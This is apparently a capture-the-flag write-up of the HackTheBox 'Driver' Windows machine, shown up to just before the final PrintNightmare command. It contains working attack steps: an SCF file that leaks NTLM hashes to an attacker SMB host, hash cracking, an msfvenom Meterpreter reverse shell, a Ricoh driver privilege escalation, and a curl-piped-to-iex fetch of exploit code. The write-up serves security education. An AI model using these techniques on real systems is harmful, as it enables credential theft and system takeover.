---
title: HTB: Driver
url: https://0xdf.gitlab.io/2022/02/26/htb-driver.html
date: 2022-02-26T14:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: ctf, hackthebox, htb-driver, nmap, windows, feroxbuster, net-ntlmv2, scf, responder, hashcat, crackmapexec, evil-winrm, cve-2019-19363, winpeas, powershell, history, powershell-history, printer, metasploit, exploit-suggestor, windows-sessions, printnightmare, cve-2021-1675, invoke-nightmare, htb-sizzle, cpts-like
---

![Driver](https://0xdfimages.gitlab.io/img/driver-cover.png)

Drive released as part of the HackTheBox printer exploitation track. To get access, there’s a printer web page that allows users to upload to a file share. I’ll upload an scf file, which triggers anyone looking at the share in Explorer to try network authentication to my server, where I’ll capture and crack the password for the user. That password works to connect to WinRM, providing a foothold to Driver. To escalate, I can exploit either a Ricoh printer driver or PrintNightmare, and I’ll show both.

## Box Info

| Name | [Driver](https://hackthebox.com/machines/driver)  [Driver](https://hackthebox.com/machines/driver) [Play on HackTheBox](https://hackthebox.com/machines/driver) |
| --- | --- |
| Release Date | [02 Oct 2021](https://twitter.com/hackthebox_eu/status/1496515400850411526) |
| Retire Date | 26 Feb 2022 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Driver |
| Radar Graph | Radar chart for Driver |
| First Blood User | 00:21:10[Wh04m1 Wh04m1](https://app.hackthebox.com/users/4483) |
| First Blood Root | 00:29:13[RealEnox RealEnox](https://app.hackthebox.com/users/256488) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` found four open TCP ports, HTTP (80), SMB/RPC (135/445), and WinRM (5985):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.106
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 15:34 EDT
Nmap scan report for 10.10.11.106
Host is up (0.11s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 32.37 seconds

oxdf@hacky$ nmap -p 80,135,445,5985 -sCV -oA scans/nmap-tcpscripts 10.10.11.106
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 15:35 EDT
Nmap scan report for 10.10.11.106
Host is up (0.098s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-10T02:35:53
|_  start_date: 2021-09-10T02:32:18

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.92 seconds

```

Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), the host is likely running Windows 10 or Server 2016+. The scripts scan on 80 shows “Basic realm=MFP Firmware Update Center. Please enter password for admin”.

WinRM is open, so if I manage to get creds for a user in the remote management group, I could get a shell over that.

### SMB - TCP 445

Without creds, I can’t connect to the share, or even list them:

```

oxdf@hacky$ smbmap -H 10.10.11.106
[!] Authentication error on 10.10.11.106
oxdf@hacky$ smbmap -H 10.10.11.106 -u 0xdf -p 0xdf
[!] Authentication error on 10.10.11.106
oxdf@hacky$ smbclient -N -L //10.10.11.106
session setup failed: NT_STATUS_ACCESS_DENIED

```

### Website - TCP 80

#### Authentication

Visiting the page returns a request for basic authentication:

![image-20210909154006531](https://0xdfimages.gitlab.io/img/image-20210909154006531.png)

Firefox isn’t showing me the additional context like `nmap` did, but looking in Burp at the response it’s there:

```

HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.25
WWW-Authenticate: Basic realm="MFP Firmware Update Center. Please enter password for admin"
Date: Fri, 10 Sep 2021 02:36:15 GMT
Connection: close
Content-Length: 20

Invalid Credentials

```

When a server wants to request the browser include auth, it will return this 401, and the `WWW-Authenticate` header says what kind of auth (in this case “Basic”) as well as a `realm`, which [Mozilla docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate) describe as:

> A description of the protected area. If no realm is specified, clients often display a formatted hostname instead.

This message is giving the username, admin. The first thing I typically guess is admin as the password, and it works.

#### Site

The site is the MFP Fireware Update Center:

[![image-20210909154400325](https://0xdfimages.gitlab.io/img/image-20210909154400325.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210909154400325.png)

Each of the links across the top lead back to `index.php`, except for “Fireware Updates”, which gives another form at `fw_up.php`:

[![image-20210909154538412](https://0xdfimages.gitlab.io/img/image-20210909154538412.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210909154538412.png)

Submitting just returns to the form. But looking in Burp, the file is sent to the server in a POST request with form data:

```

POST /fw_up.php HTTP/1.1
Host: 10.10.11.106
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------18270690295094025931815558617
Content-Length: 88439
Origin: http://10.10.11.106
DNT: 1
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Referer: http://10.10.11.106/fw_up.php
Upgrade-Insecure-Requests: 1
-----------------------------18270690295094025931815558617
Content-Disposition: form-data; name="printers"

HTB Ecotank
-----------------------------18270690295094025931815558617
Content-Disposition: form-data; name="firmware"; filename="a.jpg"
Content-Type: image/jpeg
...[snip]...

```

#### Tech Stack

The main page is `index.php`, so the page is PHP-based. The response headers give a PHP version as well as the IIS version:

```

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.25
Date: Fri, 15 Oct 2021 02:47:32 GMT
Connection: close
Content-Length: 5119

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP, and with a lowercase wordlist since Windows is case-insensitive:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.106 -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.106
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        2l       10w      150c http://10.10.11.106/images
401        2l        2w       20c http://10.10.11.106/index.php
[####################] - 1m    106332/106332  0s      found:2       errors:0      
[####################] - 1m     53166/53166   503/s   http://10.10.11.106
[####################] - 1m     53166/53166   504/s   http://10.10.11.106/images

```

`index.php` is returning 401, which is the request for basic auth. It makes sense to try busting again with the auth headers. When credentials are passed over HTTP Basic Auth, it’s just `[username]:[password]` and then base-encoded. For example:

```

Authorization: Basic YWRtaW46YWRtaW4=

```

That decodes to:

```

oxdf@hacky$ echo "YWRtaW46YWRtaW4=" | base64 -d
admin:admin

```

Adding that header to `feroxbuster` with `-H`:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.106 -x php -H "Authorization: Basic YWRtaW46YWRtaW4=" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.106
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🤯  Header                │ Authorization:  Basic YWRtaW46YWRtaW4=
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        2l       10w      150c http://10.10.11.106/images
200      185l      379w     4279c http://10.10.11.106/index.php
[####################] - 1m    106332/106332  0s      found:2       errors:0      
[####################] - 1m     53166/53166   523/s   http://10.10.11.106
[####################] - 1m     53166/53166   522/s   http://10.10.11.106/images

```

In this case, it doesn’t find anything new.

## Shell as tony

### Capture Net-NTLMv2

#### Strategy

The page says that what I upload will go to their file share. That implies it’s not going to the webserver necessarily, so looking for a way to upload webshell doesn’t make much sense.

A classic attack when you have write access to a file share is to drop a `.scf` file that references an icon file on an SMB share on an attacker-controlled host. If the folder containing the `.scf` file is opened with File Explorer, the `.scf` will inspire Explorer to connect back to get that icon file, and offer Net-NTLMv2 auth negotiation. If I control that host, and I can capture that exchange and try to crack the Net-NTLMv2 using an offline bruteforce (like `hashcat`). I used this technique on the Insane machine [Sizzle](/2019/06/01/htb-sizzle.html#get-netntlmv2) back in 2019.

SCF files are Windows Shell Command files, and there are way more references on how to make a malicious one than legit uses. Some old Microsoft pages (that no longer exist, but are on the Wayback Machine) show how to create a [Show Desktop Shortcut](https://web.archive.org/web/20101118014705/http://support.microsoft.com/kb/190355) and a [View Channels Quick Launch](https://web.archive.org/web/20101114160837/http://support.microsoft.com/kb/195737) using SCF files. The format is:

```

[Shell]
Command=2
IconFile=<icon file>
[<thing you want to control>]
Command=<command>

```

#### Capture Hash

I’ll abuse the `IconFile` bit, but having it point to my server over SMB, and create `0xdf.scf`:

```

[Shell]    
Command=2    
IconFile=\\10.10.14.6\evil.exe,3   

```

I’ll start `responder`, which will start many different kinds of server (including SMB) to listen and try to get Net-NTLMv2 challenges.

```

oxdf@hacky$ sudo responder -I tun0
...[snip]...
[+] Servers:                                                  
    HTTP server                [ON]        
    HTTPS server               [ON]   
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]     
    SQL server                 [ON]    
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]                  
    DCE-RPC server             [ON]                  
    WinRM server               [ON]
...[snip]...
[+] Listening for events...

```

I’ll upload the `.scf` file to Driver, and very quickly there’s a hit at `responder`:

```

[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:29baae537d2b9cd1:EF8CB94A1687BD65CC08365062029B8C:01010000000000008026C7CC96A5D7015CEE9067648CAF8800000000020008004E0043004400490001001E00570049004E002D004E004E004E005800450034004B004300350049004D0004003400570049004E002D004E004E004E005800450034004B004300350049004D002E004E004300440049002E004C004F00430041004C00030014004E004300440049002E004C004F00430041004C00050014004E004300440049002E004C004F00430041004C00070008008026C7CC96A5D701060004000200000008003000300000000000000000000000002000007168911B039D29C6D47B8A67F128A5DF8A68540B1822AD78C04BFC57C4F2E81B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003600000000000000000000000000

```

### Crack Hash

The Hashcat [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) shows this is mode 5600. It breaks instantly in `hashcat` to liltony:

```

$ hashcat tony.hash -m 5600 /usr/share/wordlists/rockyou.txt 
...[snip]...
TONY::DRIVER:29baae537d2b9cd1:ef8cb94a1687bd65cc08365062029b8c:01010000000000008026c7cc96a5d7015cee9067648caf8800000000020008004e0043004400490001001e00570049004e002d004e004e004e005800450034004b004300350049004d0004003400570049004e002d004e004e004e005800450034004b004300350049004d002e004e004300440049002e004c004f00430041004c00030014004e004300440049002e004c004f00430041004c00050014004e004300440049002e004c004f00430041004c00070008008026c7cc96a5d701060004000200000008003000300000000000000000000000002000007168911b039d29c6d47b8a67f128a5df8a68540b1822ad78c04bfc57c4f2e81b0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003600000000000000000000000000:liltony
...[snip]...

```

### WinRM

`crackmapexec` is a nice way to show that the creds work:

```

oxdf@hacky$ crackmapexec winrm 10.10.11.106 -u tony -p liltony
WINRM       10.10.11.106    5985   NONE             [*] None (name:10.10.11.106) (domain:None)
WINRM       10.10.11.106    5985   NONE             [*] http://10.10.11.106:5985/wsman
WINRM       10.10.11.106    5985   NONE             [+] None\tony:liltony (Pwn3d!)

```

I’ll use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to connect to WinRM (installed with `sudo gem install evil-winrm`):

```

oxdf@hacky$ evil-winrm -i 10.10.11.106 -u tony -p liltony

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents>

```

And grab `user.txt`:

```
*Evil-WinRM* PS C:\Users\tony\Desktop> cat user.txt
D2F44B35************************

```

## Shell as SYSTEM - CVE-2019-19363

### Enumeration

I’ll upload [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) to look for escalation vectors. On my VM, I’ll change into the directory where I have it downloaded and run `git pull` to get the latest version. If I didn’t have the repo on my system, I could get it with `git clone https://github.com/carlospolop/PEASS-ng`.

I’ll work out of `c:\programdata` on Driver, and upload WinPEAS with `evil-winrm`:

```
*Evil-WinRM* PS C:\programdata> upload /opt/PEASS-ng/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
Info: Uploading /opt/PEASS-ng/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe to C:\programdata\winPEASx64.exe

Data: 2564776 bytes of 2564776 bytes copied

Info: Upload successful!

```

Now I’ll run it:

```
*Evil-WinRM* PS C:\programdata> .\winPEASx64.exe
...[snip]...

```

There’s a ton of output. One thing that caught my eye was a PowerShell history file:

```

[+] PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.0.10240.17146
    PowerShell Core Version:
    Transcription Settings:
    Module Logging Settings:
    Scriptblock Logging Settings:
    PS history file: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt             
    PS history size: 106B  

```

It contains a command adding a printer:

```
*Evil-WinRM* PS C:\users\tony\appdata\roaming\microsoft\windows\PowerShell\PSReadline> cat ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

```

That’s a neat hint, specially given the box’s name (Driver) and avatar (a gloved hand dropping a gear into a printer).

There’s a printer section in WinPEAS, but it doesn’t show anything:

```

[+] Enumerating Printers (WMI) 

```

The [source code](https://github.com/carlospolop/PEASS-ng/blob/34bfc7592862dbed045fdea8919fd42ff1ab5703/winPEAS/winPEASexe/winPEAS/Info/SystemInfo/Printers/Printers.cs#L26) shows this section of enumeration makes the WMI query `SELECT * from Win32_Printer`. If I run that, it fails with access denied:

```
*Evil-WinRM* PS C:\users\tony\appdata\roaming\microsoft\windows\PowerShell\PSReadline> Get-WmiObject -Query "select * from Win32_Printer"
Access denied 
At line:1 char:1
+ Get-WmiObject -Query "select * from Win32_Printer"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

```

That means there could be something there, but I can’t see it.

### Find Exploit

Googling for that Driver version leads to [this post](https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) about CVE-2019-19363. When this driver installs, it creates a folder full of DLLs that all users have full control over, which is the case on Driver:

```
*Evil-WinRM* PS C:\programdata\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz> icacls *.dll
borderline.dll Everyone:(F)
colorbalance.dll Everyone:(F)
headerfooter.dll Everyone:(F)
jobhook.dll Everyone:(F)
outputimage.dll Everyone:(F)
overlaywatermark.dll Everyone:(F)
popup.dll Everyone:(F)
printercopyguardpreview.dll Everyone:(F)
printerpreventioncopypatternpreview.dll Everyone:(F)
secretnumberingpreview.dll Everyone:(F)
watermark.dll Everyone:(F)
watermarkpreview.dll Everyone:(F)
Successfully processed 12 files; Failed processing 0 files

```

The `(F)` is full control, which means I can write these files. These files are run as SYSTEM

### Get Meterpreter

For this exploit, there aren’t a ton of good non-Metasploit POCs available, at least at the time of release. I’ll want a Meterpreter session on the box. There is a module, `exploit/windows/winrm/winrm_script_exec`, but I couldn’t get it to work. Instead, I’ll generate a simple executable with `msfvenom`:

```

oxdf@hacky$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f e
xe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe

```

And upload it with Evil-WinRM:

```
*Evil-WinRM* PS C:\programdata> upload rev.exe
Info: Uploading rev.exe to C:\programdata\rev.exe

Data: 9556 bytes of 9556 bytes copied

Info: Upload successful!

```

In Metasploit, I’ll switch to `exploit/multi/handler`, which is the exploit that tells MSF to listen on a port for a connection from a payload and handle it. I’ll set the payload and `LHOST`, and run it:

```

msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.6       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.6:4444 

```

Now from Evil-WinRM, I’ll run the executable. It returns with no output, but at Metasploit:

```

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Sending stage (200262 bytes) to 10.10.11.106
[*] Meterpreter session 4 opened (10.10.14.6:4444 -> 10.10.11.106:49418) at 2021-09-10 13:22:03 -040

meterpreter > 

```

### Exploit Suggestor

If I knew I was going to use MSF, I could have skipped WinPEAS and just looked at the `local_exploit_suggester` module.

```

meterpreter > background 
[*] Backgrounding session 4...
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) >

```

I just need to set the `session`:

```

msf6 post(multi/recon/local_exploit_suggester) > set session 4
session => 4

```

Running it shows six potential exploits to look into:

```

msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.11.106 - Collecting local exploits for x64/windows...
[*] 10.10.11.106 - 28 exploit checks are being tried...
[+] 10.10.11.106 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/ricoh_driver_privesc: The target appears to be vulnerable. Ricoh driver directory has full permissions
[+] 10.10.11.106 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Post module execution completed

```

Ricoh is a printer manufacturer, and there’s a vulnerable driver.

### Exploit

#### Fail

To give the Ricoh exploit a try, I’ll switch to it:

```

msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ricoh_driver_privesc
[*] Using configured payload windows/x64/meterpreter/reverse_tcp

```

I’ll set my session and the payload of x64 meterpreter so that it looks like:

```

msf6 exploit(windows/local/ricoh_driver_privesc) > options

Module options (exploit/windows/local/ricoh_driver_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  4                yes       The session to run this module on.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.6       yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows

```

On running, it seems to run, but just hangs:

```

msf6 exploit(windows/local/ricoh_driver_privesc) > run

[*] Started reverse TCP handler on 10.10.14.6:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer FFWSpC...

```

#### Migration

This confused me for a while. Windows has a concept of sessions, and each process will be in one. Running `ps` in meterpreter will show which session each process is in:

```

meterpreter > ps        
                               
Process List             
============                
                               
 PID   PPID  Name                  Arch  Session  User         Path
 ---   ----  ----                  ----  -------  ----         ----                   
 0     0     [System Process]
 4     0     System     
 264   4     smss.exe    
 336   328   csrss.exe
 440   432   csrss.exe
 448   328   wininit.exe
 496   432   winlogon.exe
 556   448   services.exe     
 564   448   lsass.exe
 644   556   svchost.exe
 652   556   sedsvc.exe
 664   900   WUDFHost.exe
 696   556   svchost.exe
 728   644   wsmprovhost.exe       x64   0        DRIVER\tony  C:\Windows\System32\wsmprovhost.exe
...[snip]...
  1772  644   explorer.exe          x64   1        DRIVER\tony  C:\Windows\explorer.exe
 2096  3788  cmd.exe               x64   0        DRIVER\tony  C:\Windows\System32\cmd.exe
 2144  556   dllhost.exe
 2304  644   WmiPrvSE.exe
 2316  556   msdtc.exe
 2460  824   taskhostw.exe         x64   1        DRIVER\tony  C:\Windows\System32\taskhostw.exe
 2476  824   sihost.exe            x64   1        DRIVER\tony  C:\Windows\System32\sihost.exe
 2616  556   svchost.exe
 2872  556   SearchIndexer.exe
 3060  1312  conhost.exe           x64   1        DRIVER\tony  C:\Windows\System32\conhost.exe
 3276  3228  explorer.exe          x64   1        DRIVER\tony  C:\Windows\explorer.exe
 3304  644   explorer.exe          x64   1        DRIVER\tony  C:\Windows\explorer.exe
 3388  644   RuntimeBroker.exe     x64   1        DRIVER\tony  C:\Windows\System32\RuntimeBroker.exe
 3412  644   wsmprovhost.exe       x64   0        DRIVER\tony  C:\Windows\System32\wsmprovhost.exe
 3476  3788  cmd.exe               x64   0        DRIVER\tony  C:\Windows\System32\cmd.exe
 3616  644   ShellExperienceHost.  x64   1        DRIVER\tony  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellE
             exe                                               xperienceHost.exe
 3788  3412  rev.exe               x64   0        DRIVER\tony  C:\ProgramData\rev.exe
 3908  644   SearchUI.exe          x64   1        DRIVER\tony  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\
                                                               SearchUI.exe
 4144  2872  SearchFilterHost.exe
 4268  3476  conhost.exe           x64   0        DRIVER\tony  C:\Windows\System32\conhost.exe
 4448  5024  conhost.exe
 4536  824   taskeng.exe
 4768  1312  PING.EXE              x64   1        DRIVER\tony  C:\Windows\System32\PING.EXE
 4816  2096  conhost.exe           x64   0        DRIVER\tony  C:\Windows\System32\conhost.exe
 4876  3276  vmtoolsd.exe          x64   1        DRIVER\tony  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 4916  3276  OneDrive.exe          x86   1        DRIVER\tony  C:\Users\tony\AppData\Local\Microsoft\OneDrive\OneDrive.exe
 5024  4536  sedlauncher.exe

```

`rev.exe` is in session 0. To get into session 1, I’ll `migrate` into a process there. `explorer.exe` seems like a good candidate:

```

meterpreter > migrate -N explorer.exe
[*] Migrating from 3788 to 3276...
[*] Migration completed successfully.

```

#### Success

Now if I leave that meterpreter session and run the exploit again, it works:

```

meterpreter > background 
[*] Backgrounding session 4...
msf6 exploit(windows/local/ricoh_driver_privesc) > run

[*] Started reverse TCP handler on 10.10.14.6:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer vViSBvm...
[*] Sending stage (200262 bytes) to 10.10.11.106
[+] Deleted C:\Users\tony\AppData\Local\Temp\irojvi.bat
[+] Deleted C:\Users\tony\AppData\Local\Temp\headerfooter.dll
[*] Meterpreter session 5 opened (10.10.14.6:5555 -> 10.10.11.106:49419) at 2021-09-10 13:31:41 -0400
[*] Deleting printer vViSBvm

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

And I can access `root.txt`:

```

meterpreter > cd /users/administrator/desktop
meterpreter > cat root.txt
23CF8138************************

```

### Other Exploits

I did try the other exploits from exploit suggester. Both CVE-2020-1337 and CVE-2020-1048 started to run, but didn’t complete. The other two suggested were UAC bypasses, which isn’t what I needed here.

## Shell as administrator - PrintNightmare

### Background

This box was developed as part of the [Intro to Printer Exploitation](https://app.hackthebox.com/tracks/Intro-to-Printer-Exploitation) track on HackTheBox. Just as it was in development, PrintNightmare exploded onto the scene (I did a post about it [here](/2021/07/08/playing-with-printnightmare.html)). Drive was left vulnerable to PrintNightmare as well.

PrintNightmare abuses how Windows allows for a non-administrative user to load printer drivers in an unsafe way that ends up giving execution as SYSTEM.

In my previous post, I showed three different exploit versions. I’ll just use the `Invoke-Nightmare` PowerShell script here.

### Import Exploit

#### Get Exploit

The `Invoke-Nightmare` PowerShell script can be run with a low priv shell to add an admin user to the box. I’ll download the exploit with `git` (and rename the directory to something I’ll recognize:

```

oxdf@hacky$ git clone https://github.com/calebstewart/CVE-2021-1675
Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 40, done.
remote: Counting objects: 100% (40/40), done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 40 (delta 9), reused 37 (delta 6), pack-reused 0
Unpacking objects: 100% (40/40), 131.10 KiB | 789.00 KiB/s, done.
oxdf@hacky$ mv CVE-2021-1675/ invoke-nightmare

```

#### Import Fail

Now I can upload the exploit over my WinRM session:

```
*Evil-WinRM* PS C:\programdata> upload /opt/invoke-nightmare/CVE-2021-1675.ps1
Info: Uploading /opt/invoke-nightmare/CVE-2021-1675.ps1 to C:\programdata\CVE-2021-1675.ps1

Data: 238080 bytes of 238080 bytes copied

Info: Upload successful!

```

However, trying to import the module is blocked by execution policy:

```
*Evil-WinRM* PS C:\programdata> Import-Module .\CVE-2021-1675.ps1
File C:\programdata\CVE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1                                
+ Import-Module .\CVE-2021-1675.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand  

```

I can try the other syntax, but it fails as well:

```
*Evil-WinRM* PS C:\programdata> . .\CVE-2021-1675.ps1
File C:\programdata\CVE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:3                    
+ . .\CVE-2021-1675.ps1
+   ~~~~~~~~~~~~~~~~~~~  
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess

```

#### Import Success

The simplest way to handle this is to just read it from my host as an HTTP request and pipe that into `iex` (or `Invoke-Expression`). I’ll start a Python web server on my host in the directory where the PS1 script is with `python3 -m http.server 80`, and the request the file:

```
*Evil-WinRM* PS C:\programdata> curl 10.10.14.6/CVE-2021-1675.ps1 -UseBasicParsing | iex

```

`-UseBasicParsing` will allow the file to come back even if the IE engine isn’t available.

Now the commandlet is in my current PowerShell session:

```
*Evil-WinRM* PS C:\programdata> Get-Command Invoke-Nightmare

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Invoke-Nightmare

```

### Shell

#### Run Exploit

By default, `Invoke-Nightmare` adds a user adm1n with the password “P@ssw0rd”. I’ll use arguments to add my own user and password:

```
